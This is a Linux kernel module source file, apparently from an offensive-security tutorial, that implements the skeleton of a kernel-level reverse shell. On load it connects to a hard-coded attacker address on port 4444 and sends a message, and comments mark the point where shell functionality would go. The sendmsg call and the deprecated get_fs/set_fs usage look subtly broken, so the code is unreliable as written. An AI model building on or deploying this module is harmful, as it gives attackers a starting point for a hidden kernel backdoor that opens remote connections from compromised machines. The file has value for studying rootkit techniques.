#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cocomelonc");
MODULE_DESCRIPTION("kernel revsh");
MODULE_VERSION("0.01");

// define server IP and port for reverse shell connection
#define ATTACKER_IP "192.168.56.1"  // replace with attacker's IP
#define ATTACKER_PORT 4444       // replace with attacker's port

static int __init reverse_shell_init(void) {
  struct socket *sock;
  struct sockaddr_in server_addr;
  int ret;
  mm_segment_t old_fs;
  char *message = "Hello from kernel!";
  
  printk(KERN_INFO "initializing reverse shell kernel module...\n");

  // Create a socket
  ret = sock_create(AF_INET, SOCK_STREAM, 0, &sock);
  if (ret < 0) {
    printk(KERN_ALERT "socket creation failed!\n");
    return -1;
  }

  // Fill in the server address structure
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(ATTACKER_PORT);
  server_addr.sin_addr.s_addr = in_aton(ATTACKER_IP);

  // Connect to the attacker
  ret = sock->ops->connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr), 0);
  if (ret < 0) {
    printk(KERN_ALERT "connection failed!\n");
    sock_release(sock);
    return -1;
  }

  printk(KERN_INFO "connected to attacker %s:%d\n", ATTACKER_IP, ATTACKER_PORT);

  // send a message to the attacker (basic test)
  old_fs = get_fs();
  set_fs(KERNEL_DS);
  ret = kernel_sendmsg(sock, NULL, message, strlen(message), strlen(message));
  set_fs(old_fs);

  if (ret < 0) {
    printk(KERN_ALERT "failed to send message to attacker!\n");
  }

  // simulating command execution (simple echo for educational purposes)
  char cmd_output[] = "echo 'meow-meow!!!!!'";
  
  // we would implement more sophisticated command execution or 
  // shell functionality here
  printk(KERN_INFO "sent message: %s\n", cmd_output);

  // closing the socket after sending data
  sock_release(sock);
  
  return 0;
}

static void __exit reverse_shell_exit(void) {
  printk(KERN_INFO "exiting reverse shell module...\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
